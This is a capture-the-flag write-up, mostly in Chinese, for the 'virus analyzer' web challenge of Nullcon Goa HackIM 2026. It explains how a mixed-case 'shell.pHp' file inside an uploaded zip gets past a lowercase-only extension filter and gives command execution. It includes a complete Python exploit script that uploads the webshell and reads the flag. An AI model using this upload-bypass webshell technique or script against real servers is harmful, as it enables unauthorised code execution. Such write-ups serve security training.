---
title: "virus analyzer - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "race"
type: "writeup"
tags: ["web", "race-condition", "file-upload", "zip-slip", "virus", "analyzer", "race", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: web/virusanalyzer"
source:
  name: "CTFtime writeup #40548"
  url: "https://ctftime.org/writeup/40548"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "virus analyzer"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** virus analyzer
- **Author team:** 正规子群.AI
- **CTFtime tags:** web, race-condition, file-upload
- **CTFtime:** <https://ctftime.org/writeup/40548>

---
## 130 virus analyzer

\- Category: `web`  
\- Value: `200`  
\- Solves: `101`  
\- Solved by me: `True`  
\- Local directory: `web/virusanalyzer`

### 题目描述  
> I wrote my own virus analyzer! To make it more secure, To make it more secure I did not provide any source code.

### 连接信息  
\- `52.59.124.14:5008`

### 附件下载地址  
\- 无

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# virus analyzer

\---  
## 题目信息  
\- 名称: `virus analyzer`  
\- 类型: Web  
\- 分值: `500`  
\- 目标: 获取服务端 flag  
\- 目标地址: `52.59.124.14:5008`

\---  
## 初步侦察  
先访问首页，确认是一个 ZIP 上传与分析页面，表单字段为 `zipfile`。

随后做多组基线测试：  
\- 上传普通 `a.txt` 的 zip: 成功，返回 `/uploads/<16hex>/a.txt` 可访问。  
\- 上传损坏 zip: 页面提示 `Failed to extract zip archive.`。  
\- 上传非 zip: 页面提示 `Only .zip files allowed.`。

这说明后端存在“解压后可直接访问文件”的路径，攻击面在上传后缀过滤与 Web 解释器映射。

\---  
## 失败尝试记录  
1\. Zip Slip (`../`) 路径穿越写文件。  
结果: 条目会被规范化到上传目录下，未写出 Web 根。

2\. 软链接读取 (`zip -y` + 指向 `/flag`)。  
结果: 解压后为普通文件内容 `/flag`，未保留真实符号链接语义。

3\. 直接读取 `/flag`。  
结果: 回显为空，路径不对。

\---  
## 漏洞定位与利用  
### 1 关键现象  
上传后缀差异测试发现：  
\- `evil.php` 返回链接但访问 `404`。  
\- `evil.phtml`、`evil.phps`、`evil.php7` 可访问但不执行。  
\- `shell.pHp`（混合大小写）可被 PHP 解释执行。

即后端过滤是“仅拦截严格小写 `.php`”，属于大小写绕过。

### 2 构造 WebShell  
在 zip 内写入 `shell.pHp`，内容为：

```php

```

上传后访问 `/uploads/<随机目录>/shell.pHp?c=id`，成功回显：  
`uid=1000(webuser)`，确认 RCE 成立。

### 3 读取 flag  
通过 RCE 枚举根目录，发现 `/flag.txt` 存在。  
执行：`cat /flag.txt` 得到 flag。

\---  
## Flag  
```text  
ENO{R4C1NG_UPL04D5_4R3_FUN}  
```

\---  
## 自动化脚本说明  
\- 路径: `solution/[solution.py](http://solution.py)`  
\- 功能:  
1\. 内存构造恶意 zip（`shell.pHp`）  
2\. `POST /` 上传  
3\. 正则提取 shell 链接  
4\. 执行 `cat /flag.txt`  
5\. 自动提取 `flag{}` 或 `ENO{}` 格式

运行方式：  
```bash  
python3 solution/[solution.py](http://solution.py)  
```

### Exploit  
#### web/virusanalyzer/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import io  
import os  
import re  
import sys  
import urllib.parse  
import urllib.request  
import zipfile

BASE = os.environ.get("TARGET", "http://52.59.124.14:5008")  
UPLOAD_FIELD = "zipfile"

def build_zip_bytes() -> bytes:  
payload = ''  
bio = io.BytesIO()  
with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:  
# bypass: backend blocks only lowercase .php  
zf.writestr("shell.pHp", payload)  
return bio.getvalue()

def multipart_body(field_name: str, filename: str, content: bytes, content_type: str = "application/zip"):  
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"  
head = (  
f"--{boundary}\r\n"  
f"Content-Disposition: form-data; name=\"{field_name}\"; filename=\"{filename}\"\r\n"  
f"Content-Type: {content_type}\r\n\r\n"  
).encode()  
tail = f"\r\n--{boundary}--\r\n".encode()  
body = head + content + tail  
return boundary, body

def upload_shell(zip_bytes: bytes) -> str:  
boundary, body = multipart_body(UPLOAD_FIELD, "exploit.zip", zip_bytes)  
req = urllib.request.Request(  
BASE + "/",  
data=body,  
headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},  
method="POST",  
)  
with urllib.request.urlopen(req, timeout=10) as resp:  
html = resp.read().decode("utf-8", errors="ignore")

m = re.search(r'href="(/uploads/[0-9a-f]{16}/shell\\.pHp)"', html)  
if not m:  
raise RuntimeError("上传成功但未找到 shell 链接，漏洞可能已修复")  
return urllib.parse.urljoin(BASE, m.group(1))

def run_cmd(shell_url: str, cmd: str) -> str:  
q = urllib.parse.urlencode({"c": cmd})  
with urllib.request.urlopen(f"{shell_url}?{q}", timeout=10) as resp:  
return resp.read().decode("utf-8", errors="ignore")

def main() -> int:  
zip_bytes = build_zip_bytes()  
shell_url = upload_shell(zip_bytes)  
print(f"[+] shell: {shell_url}")

out = run_cmd(shell_url, "cat /flag.txt")  
print("[+] raw:", out.strip())

m = re.search(r"(flag\\{[^\n\r}]+\\}|ENO\\{[^\n\r}]+\\})", out)  
if not m:  
# fallback for variant deployments  
out2 = run_cmd(shell_url, "find / -maxdepth 3 -type f -iname '*flag*' 2>/dev/null | head -n 10")  
print("[!] /flag.txt miss, candidates:")  
print(out2.strip())  
return 1

print("[+] FLAG:", m.group(1))  
return 0

if __name__ == "__main__":  
sys.exit(main())  
```

\---
